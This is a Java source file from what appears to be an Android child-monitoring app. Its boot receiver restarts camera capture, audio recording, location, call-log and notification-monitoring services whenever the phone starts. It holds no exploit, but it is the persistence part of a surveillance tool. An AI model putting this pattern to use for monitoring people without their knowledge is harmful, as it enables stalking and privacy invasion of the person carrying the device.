package com.monitor.child.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;

import com.monitor.child.utils.Constants;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            SharedPreferences prefs = context.getSharedPreferences("child_prefs", Context.MODE_PRIVATE);
            String pairedEmail = prefs.getString(Constants.PREF_PAIRED_EMAIL, null);
            if (pairedEmail != null) {
                startServiceCompat(context, new Intent(context, CameraCaptureService.class));
                startServiceCompat(context, new Intent(context, AudioRecordService.class));
                startServiceCompat(context, new Intent(context, LocationService.class));
                startServiceCompat(context, new Intent(context, CallLogMonitor.class));
                startServiceCompat(context, new Intent(context, NotificationMonitor.class));
            }
        }
    }

    private void startServiceCompat(Context context, Intent intent) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }
}
